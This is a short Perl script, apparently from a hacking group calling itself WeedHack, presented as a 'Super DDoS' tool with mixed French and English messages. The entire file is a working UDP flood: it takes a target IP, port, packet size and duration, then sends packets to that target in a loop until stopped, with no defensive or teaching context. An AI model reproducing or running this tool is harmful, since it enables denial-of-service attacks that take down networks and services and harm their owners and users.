#!/usr/bin/perl

########################
# WeedHack - Pokerface #
########################

use Socket;
use strict;

if ($#ARGV != 3) {
print " \n";
print "Super DDoS // by WeedHack\n\n";
print "Commande: flood.pl <ip> <port> <packets> <temps(secondes)>\n";
print " port: port to flood. Set to 0 for all.\n";
print " packets: the number of packets to send. Between 64 and 1024.\n";
print " temps: flood time in seconds.\n";
exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Impossible de se connecter à $ip\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);


print "Flooding en cours sur $ip avec le port " . ($port ? $port : "random") . ", envoit de " .
($size ? "$size-byte" : "random size") . " packets" .
($time ? " pour $time secondes" : "") . "\n";
print "Stop Attaque Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1500-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}